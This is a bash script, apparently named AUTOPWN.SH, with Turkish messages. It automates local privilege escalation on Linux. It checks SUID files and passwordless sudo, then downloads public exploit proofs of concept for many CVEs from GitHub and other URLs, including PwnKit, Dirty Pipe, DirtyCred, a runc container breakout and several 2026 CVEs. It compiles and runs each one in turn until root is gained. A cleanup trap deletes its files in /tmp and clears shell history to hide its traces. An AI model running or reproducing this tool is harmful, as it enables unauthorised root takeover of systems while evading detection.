#!/bin/bash
# ============================================
#    AUTOPWN.SH - ULTIMATE COLORED & ZERO-FOOTPRINT
# ============================================

# Renk Tanımlamaları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # Color Reset

cleanup() {
    echo -e "\n${YELLOW}[*] Temizlik yapiliyor: Tum gecici dosya ve dizinler temizleniyor...${NC}"
    rm -rf /tmp/CVE-* /tmp/dirty* /tmp/pwn* /tmp/gameover* /tmp/pocs /tmp/Dirty* /tmp/cve-* /tmp/cybermeowfia /tmp/tontou* /tmp/OVSwrap /tmp/runc-breakout 2>/dev/null
    history -c 2>/dev/null
    echo -e "${GREEN}[+] Sistem tertemiz birakildi.${NC}"
}

trap cleanup EXIT INT TERM

check_root() {
    if [ "$EUID" -eq 0 ]; then
        echo -e "\n${GREEN}"
        echo "##################################################"
        echo "#                                                #"
        echo "#   [+] MUTLAK BASARI! ROOT YETKISI ELDE EDILDI! #"
        echo "#   [+] Mevcut Kullanici: $(whoami)                  #"
        echo "#                                                #"
        echo "##################################################"
        echo -e "${NC}"
        exit 0
    fi
}

clear
echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════════╗"
echo "║          AUTOPWN.SH - ULTIMATE EDITION           ║"
echo "║        Zero-Footprint & Colorized LPE Suite      ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${BLUE}[*] Mevcut Kullanici Bilgisi:${NC}"
whoami
id
echo ""

# Hızlı Ön Keşif (Sistemde hızlıca ne var ne yok bakalım)
echo -e "${YELLOW}[*] Sistem hızlı ön keşfi yapılıyor...${NC}"
echo -n "[-] SUID Dosyaları (Özet): " && find / -perm -4000 -type f 2>/dev/null | wc -l
echo -n "[-] Sudo Hakları: " && (sudo -n l 2>/dev/null && echo "Var (Parolasız!)" || echo "Yok / Parola Gerekli")
echo ""

cd /tmp || exit

# ============================================
#       1. KESIN CALISAN (LEGACY & PROVEN)
# ============================================
echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] PwnKit (CVE-2021-4034) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/CVE-2021-4034 /tmp/pwn.c /tmp/pwn
curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o /tmp/pwn.c
gcc /tmp/pwn.c -o /tmp/pwn && /tmp/pwn
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] Dirty Pipe (CVE-2022-0847) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/dirtypipe
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git /tmp/dirtypipe
cd /tmp/dirtypipe && gcc exploit.c -o exploit && ./exploit
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] GameOver(lay) (CVE-2023-2640 + CVE-2023-32629) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o /tmp/gameover.sh
chmod +x /tmp/gameover.sh && /tmp/gameover.sh
check_root

# ============================================
#       2. KERNEL'E BAGLI & YENI CVE'LER
# ============================================
echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] Dirty Cred deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/dirtycred
git clone https://github.com/PR0fix/DirtyCred.git /tmp/dirtycred
cd /tmp/dirtycred && make && ./exploit
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] DirtyFrag deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/dirtyfrag
git clone https://github.com/V4bel/dirtyfrag.git /tmp/dirtyfrag
cd /tmp/dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] FragNesia deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/pocs
git clone https://github.com/v12-security/pocs.git /tmp/pocs
cd /tmp/pocs/fragnesia && gcc -o exp fragnesia.c && ./exp
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] TONTOU (Spectre v2 bypass) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/tontou-main /tmp/tontou.zip
wget -q https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -O /tmp/tontou.zip
unzip -o /tmp/tontou.zip -d /tmp
cd /tmp/tontou-main && make && ./tontou
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] CVE-2026-46215 deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/CVE-2026-46215
git clone https://github.com/bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable.git /tmp/CVE-2026-46215
cd /tmp/CVE-2026-46215 && gcc -o exploit exploit.c -lpthread -static && ./exploit
check_root

# ============================================
#       3. SERVIS BAZLI & KONTEYNER
# ============================================
echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] Polkit / DBus LPE (CVE-2021-3560) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/cve-2021-3560
git clone https://github.com/cybersecurityworks/CVE-2021-3560-Exploit-POC.git /tmp/cve-2021-3560
cd /tmp/cve-2021-3560 && python3 cve-2021-3560.py
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] runc Container Breakout deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/runc-breakout
git clone https://github.com/snyk/CVE-2024-21626-PoC.git /tmp/runc-breakout
cd /tmp/runc-breakout && ./exploit.sh
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] OVSwrap deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/OVSwrap
git clone https://github.com/manizada/OVSwrap.git /tmp/OVSwrap
cd /tmp/OVSwrap && python3 ovswrap-poc.py
check_root

# ============================================
#       4. 2026 GUNCEL VE ÖZEL EXPLOITLER
# ============================================
echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] CVE-2026-68138 deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/CVE-2026-68138
git clone https://github.com/aramosf/CVE-2026-68138.git /tmp/CVE-2026-68138
cd /tmp/CVE-2026-68138 && ./build.sh && ./build/exploit 2>/dev/null || gcc -O2 -static -pthread -Wall -Wextra -o exploit exploit.c && ./exploit
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] CVE-2026-68398 deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/cve-2026-68398
git clone https://github.com/aramosf/cve-2026-68398.git /tmp/cve-2026-68398
cd /tmp/cve-2026-68398 && make && ./build/CVE-2026-68398 auto 60 2>/dev/null || gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread && ./exploit
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] DirtyDecrypt (CVE-2026-31635) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/DirtyDecrypt
git clone https://github.com/0xBlackash/DirtyDecrypt.git /tmp/DirtyDecrypt
cd /tmp/DirtyDecrypt && gcc -O2 -static -pthread CVE-2026-31635.c -o DirtyDecrypt && ./DirtyDecrypt
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] CyberMeowfia (CVE-2026-52923) deneniyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
rm -rf /tmp/cybermeowfia
git clone https://github.com/NebuSec/CyberMeowfia.git /tmp/cybermeowfia
cd /tmp/cybermeowfia/security-research/Linux-CVE-2026-52923-RHEL-6.12.0-211.7.3.el10_2 && make && ./exploit
check_root

echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "${YELLOW}[+] PackageKit (CVE-2026-41651) kontrol ediliyor...${NC}"
echo -e "${CYAN}--------------------------------------------------${NC}"
if dpkg -l 2>/dev/null | grep -qi packagekit; then
    rm -rf /tmp/CVE-2026-41651
    git clone https://github.com/Vozec/CVE-2026-41651.git /tmp/CVE-2026-41651
    cd /tmp/CVE-2026-41651 && chmod +x cve-2026-41651 && ./cve-2026-41651
    check_root
else
    echo -e "${RED}[-] PackageKit sistemde bulunamadi.${NC}"
fi

echo -e "\n${RED}[*] Tum denemeler tamamlandi (Root elde edilemedi).${NC}"
